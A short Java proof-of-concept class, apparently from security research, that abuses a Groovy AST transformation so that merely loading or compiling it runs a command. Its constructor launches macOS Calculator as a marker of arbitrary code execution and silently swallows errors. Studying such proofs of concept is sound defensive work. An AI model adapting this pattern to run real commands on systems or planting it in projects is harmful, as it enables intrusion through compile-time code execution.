package org.example;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

/**
 * @author Whoopsunix
 */
@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
public class GroovyPoc implements ASTTransformation {
    public GroovyPoc(){
        try{
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        }catch (Exception ex){

        }
    }

    @Override
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {

    }
}
